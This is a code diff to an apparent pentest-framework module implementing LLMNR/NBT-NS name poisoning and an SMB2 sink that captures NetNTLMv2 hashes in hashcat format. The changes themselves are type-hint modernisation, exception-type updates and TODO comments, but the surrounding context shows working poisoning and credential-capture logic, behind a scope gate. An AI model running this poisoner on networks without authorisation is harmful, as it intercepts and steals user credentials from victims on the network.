@@ -50,7 +50,8 @@ import sys
 import threading
 import time
 from pathlib import Path
-from typing import Any, Callable, Dict, List, Optional, Tuple
+from typing import Any
+from collections.abc import Callable
 
 if __package__ in (None, ""):
     # Direct execution (the job subprocess): `python listeners/x.py` puts
@@ -106,7 +107,7 @@ def capture_file() -> Path:
 
 # --- identity blacklist -----------------------------------------------------
 
-def _own_names() -> List[str]:
+def _own_names() -> list[str]:
     names = [os.uname().nodename.lower()] if hasattr(os, "uname") else []
     if names and "." in names[0]:
         short = names[0].split(".")[0]
@@ -115,7 +116,7 @@ def _own_names() -> List[str]:
     return [n for n in names if n]
 
 
-def _should_poison(name: str) -> Tuple[bool, str]:
+def _should_poison(name: str) -> tuple[bool, str]:
     """Blacklist decision for a queried name (lowercased)."""
     n = (name or "").strip().lower().rstrip(".")
     if not n:
@@ -161,7 +162,7 @@ def encode_netbios_name(name: str, suffix: int = 0x20) -> bytes:
 
 # --- LLMNR ------------------------------------------------------------------
 
-def build_llmnr_response(query: bytes, our_ip: str) -> Optional[bytes]:
+def build_llmnr_response(query: bytes, our_ip: str) -> bytes | None:
     """Answer an LLMNR **A** query with ``our_ip`` (unicast to the querier).
 
     AAAA (and other qtypes) return None — silently ignored: answering an
@@ -196,7 +197,7 @@ def build_llmnr_response(query: bytes, our_ip: str) -> Optional[bytes]:
 
 # --- NBT-NS -----------------------------------------------------------------
 
-def build_nbns_response(query: bytes, our_ip: str) -> Optional[bytes]:
+def build_nbns_response(query: bytes, our_ip: str) -> bytes | None:
     """Answer an NB (type 0x20) name query: question echo + NB record = us."""
     if len(query) < 14:
         return None
@@ -270,12 +271,12 @@ def build_ntlmssp_challenge(challenge: bytes, target: str = "WORKGROUP") -> byte
     return _NTLMSSP_SIG + struct.pack("<I", TYPE2) + body + tname + tinfo
 
 
-def _short_len_off(buf: bytes, off: int) -> Tuple[int, int]:
+def _short_len_off(buf: bytes, off: int) -> tuple[int, int]:
     ln, mx, at = struct.unpack_from("<HHI", buf, off)
     return ln, at
 
 
-def parse_ntlmssp_auth(buf: bytes, challenge_hex: str) -> Optional[Dict[str, Any]]:
+def parse_ntlmssp_auth(buf: bytes, challenge_hex: str) -> dict[str, Any] | None:
     """Parse a Type-3 into a hashcat -m 5600 / john netntlmv2 hash line.
 
     Returns ``{user, domain, workstation, hash_line, lm_cred}`` or None.
@@ -373,7 +374,7 @@ def build_logon_failure(msg_id: int, session_id: int = 0) -> bytes:
 
 # --- capture persistence -----------------------------------------------------
 
-def _store_capture(entry: Dict[str, Any]) -> None:
+def _store_capture(entry: dict[str, Any]) -> None:
     path = capture_file()
     line = json.dumps(entry, sort_keys=True) + "\n"
     try:
@@ -381,7 +382,7 @@ def _store_capture(entry: Dict[str, Any]) -> None:
                 p, f, 0o600)) as fh:
             fh.write(line)
         os.chmod(path, 0o600)
-    except Exception:  # noqa: BLE001 - persistence must never kill the engine
+    except Exception:  # noqa: BLE001 - persistence must never kill the engine #TODO: BUT SURELY WE CAN DO SOMETHING OTHER THAN PASSING
         pass
     try:
         from utils.memory_tools import remember_text
@@ -404,13 +405,13 @@ class PoisonEngine:
     """UDP poisoner for one protocol (LLMNR or NBT-NS). One thread."""
 
     def __init__(self, proto: str, iface_ip: str, port: int,
-                 on_query: Optional[callable] = None) -> None:
+                 on_query: callable | None = None) -> None:
         self.proto = proto  # "llmnr" | "nbns"
         self.iface_ip = iface_ip
         self.port = port
         self.on_query = on_query or (lambda *a, **k: None)
-        self.sock: Optional[socket.socket] = None
-        self.thread: Optional[threading.Thread] = None
+        self.sock: socket.socket | None = None
+        self.thread: threading.Thread | None = None
         self._stop = threading.Event()
 
     def start(self) -> None:
@@ -437,7 +438,7 @@ class PoisonEngine:
         while not self._stop.is_set():
             try:
                 data, addr = self.sock.recvfrom(1500)
-            except socket.timeout:
+            except TimeoutError:
                 continue
             except OSError:
                 break
@@ -485,14 +486,14 @@ class SMB2CaptureSink:
     """TCP 445 self-contained sink: negotiate -> challenge -> capture -> deny."""
 
     def __init__(self, iface_ip: str, port: int,
-                 on_capture: Optional[Callable] = None,
-                 on_error: Optional[Callable] = None) -> None:
+                 on_capture: Callable | None = None,
+                 on_error: Callable | None = None) -> None:
         self.iface_ip = iface_ip
         self.port = port
         self.on_capture = on_capture or (lambda *a, **k: None)
         self.on_error = on_error or (lambda *a, **k: None)
-        self.sock: Optional[socket.socket] = None
-        self.thread: Optional[threading.Thread] = None
+        self.sock: socket.socket | None = None
+        self.thread: threading.Thread | None = None
         self._stop = threading.Event()
         self.smb1_seen = 0
 
@@ -511,14 +512,14 @@ class SMB2CaptureSink:
         while not self._stop.is_set():
             try:
                 conn, addr = self.sock.accept()
-            except socket.timeout:
+            except TimeoutError:
                 continue
             except OSError:
                 break
             threading.Thread(
                 target=self._serve, args=(conn, addr), daemon=True).start()
 
-    def _serve(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
+    def _serve(self, conn: socket.socket, addr: tuple[str, int]) -> None:
         challenge = os.urandom(8)
         conn.settimeout(10)
         try:
@@ -575,7 +576,7 @@ class SMB2CaptureSink:
                 import traceback
 
                 self.on_error(traceback.format_exc())
-            except Exception:
+            except Exception: #TODO: fix amibious pass in functions
                 pass
             return
         finally:
@@ -585,7 +586,7 @@ class SMB2CaptureSink:
                 pass
 
     @staticmethod
-    def _read_nbss(conn: socket.socket) -> Optional[bytes]:
+    def _read_nbss(conn: socket.socket) -> bytes | None:
         """Read one NBSS-framed SMB2 message; NetBIOS session requests
         (0x81) are answered positive (0x82) and skipped — direct-hosting on
         445 never sends them, but non-445/139-style clients do."""
@@ -672,7 +673,7 @@ def _pick_ip(iface: str) -> str:
         s.close()
 
 
-def run_job_process(argv: List[str]) -> int:
+def run_job_process(argv: list[str]) -> int:
     """Long-lived engines; SIGTERM cleans up. Captures persist to run/ + memory."""
     # Belt for any invocation path (the gate also lives in responders_start,
     # and discovery-avoidance via _NO_LOCAL_TOOL is the hat): a raw job-main
@@ -703,17 +704,17 @@ def run_job_process(argv: List[str]) -> int:
                     p, f, 0o600)) as fh:
                 fh.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
         except Exception:
-            pass
+            pass #TODO: log the exception or handle it in a more meaningful way
 
     iface_ip = _pick_ip(args.iface)
 
-    def _on_capture(entry: Dict[str, Any]) -> None:
+    def _on_capture(entry: dict[str, Any]) -> None:
         _store_capture(entry)
         fh_log(f"CAPTURE {entry['user']}::{entry['domain']} "
                f"from {entry['victim_ip']} challenge={entry['challenge_hex']}")
 
     def _on_query(kind: str) -> Callable[..., None]:
-        def cb(data: bytes, addr: Tuple[str, int], name: str,
+        def cb(data: bytes, addr: tuple[str, int], name: str,
                ok: bool, why: str) -> None:
             fh_log(f"{kind} query {name!r} from {addr[0]} -> "
                    f"{'ANSWER' if ok else 'SKIP ' + why}")
@@ -724,7 +725,7 @@ def run_job_process(argv: List[str]) -> int:
     nbns = PoisonEngine(
         "nbns", iface_ip, args.nbns_port, on_query=_on_query("NBNS"))
     sink = SMB2CaptureSink(iface_ip, args.smb_port, on_capture=_on_capture)
-    engines: List[Any] = [llmnr, nbns, sink]
+    engines: list[Any] = [llmnr, nbns, sink]
 
     import signal
 
@@ -752,7 +753,7 @@ def run_job_process(argv: List[str]) -> int:
 
 # --- framework tools ----------------------------------------------------------
 
-def _four45_capable() -> Tuple[bool, str]:
+def _four45_capable() -> tuple[bool, str]:
     """Fail-closed port-445 capability probe with the remediation string."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -794,7 +795,7 @@ def responders_start(
     llmnr_port: int = LLMNR_PORT,
     nbns_port: int = NBNS_PORT,
     smb_port: int = SMB_PORT,
-) -> Dict[str, Any]:
+) -> dict[str, Any]:
     """Start poisoner + sink as a background job; returns a job_id."""
     if not _lab_mode():
         from utils.scope_gate import ScopeGateError
@@ -841,7 +842,7 @@ def responders_start(
     tags=["net.services"],
     untrusted_target=True,
 )
-def responders_status(job_id: str) -> Dict[str, Any]:
+def responders_status(job_id: str) -> dict[str, Any]:
     poll = poll_job(job_id, tool_name=_TOOL_NAME)
     caps = _read_captures(limit=5)
     out = {"status": "Success", "job": poll, "captures": caps,
@@ -853,7 +854,7 @@ def responders_status(job_id: str) -> Dict[str, Any]:
     "Stop a responder job (clean SIGTERM; engines close their sockets).",
     tags=["net.services"],
 )
-def responders_stop(job_id: str) -> Dict[str, Any]:
+def responders_stop(job_id: str) -> dict[str, Any]:
     ok = terminate_job(job_id)
     return {"status": "Success", "job_id": job_id, "terminated": bool(ok)}
 
@@ -870,11 +871,11 @@ def responders_stop(job_id: str) -> Dict[str, Any]:
     tags=["net.services"],
     untrusted_target=True,
 )
-def responders_captures(q: int = 20) -> Dict[str, Any]:
+def responders_captures(q: int = 20) -> dict[str, Any]:
     return {"status": "Success", "captures": _read_captures(limit=int(q))}
 
 
-def _read_captures(limit: int) -> List[Dict[str, Any]]:
+def _read_captures(limit: int) -> list[dict[str, Any]]:
     path = capture_file()
     if not path.is_file():
         return []
@@ -896,7 +897,7 @@ def _count_captures() -> int:
     if not path.is_file():
         return 0
     try:
-        with open(path, "r", encoding="utf-8", errors="replace") as fh:
+        with open(path, encoding="utf-8", errors="replace") as fh:
             return sum(1 for line in fh if line.strip())
     except OSError:
         return 0
